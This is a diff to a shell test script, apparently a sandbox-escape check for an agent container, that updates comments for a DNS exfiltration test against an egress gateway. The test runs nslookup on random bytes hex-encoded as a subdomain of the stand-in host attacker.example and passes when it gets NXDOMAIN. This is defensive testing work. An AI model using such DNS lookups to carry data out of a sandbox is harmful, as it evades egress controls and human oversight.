@@ -126,15 +126,19 @@ echo
 # D. Data exfil — DNS
 # ---------------------------------------------------------------------
 
-echo "D. DNS exfiltration (currently UNDEFENDED)"
+echo "D. DNS exfiltration (defended by the egress gateway when deployed behind it)"
 
 # D4. DNS exfil — dig any subdomain of an arbitrary attacker zone.
-# Expected NOW: succeeds (egress control not implemented).
-# Expected AFTER EC-2 ships: NXDOMAIN.
+# EC-2 shipped the gateway authoritative DNS resolver (enforce + empty
+# platform allowlist → NXDOMAIN for non-allowlisted names). So:
+#   - Agent behind the gateway (compose/k8s deploy): NXDOMAIN → blocked.
+#   - Bare container with no gateway resolver (dev): may still resolve.
+# A [GAP] here means this container is NOT routed through the gateway's
+# DnsServer — check the deploy wiring, not the code.
 if _exec 'timeout 2 nslookup $(head -c 10 /dev/urandom | xxd -p).attacker.example 2>&1 | grep -qv "NXDOMAIN"'; then
-    echo "  [GAP] D4 DNS exfil succeeded (known gap; egress control not shipped)"
+    echo "  [GAP] D4 DNS exfil succeeded — this container is not behind the egress gateway resolver (deploy wiring)"
 else
-    _pass "D4 DNS exfil blocked — EC-2 or equivalent has landed"
+    _pass "D4 DNS exfil blocked — egress gateway DNS resolver (EC-2) engaged"
 fi
 
 echo
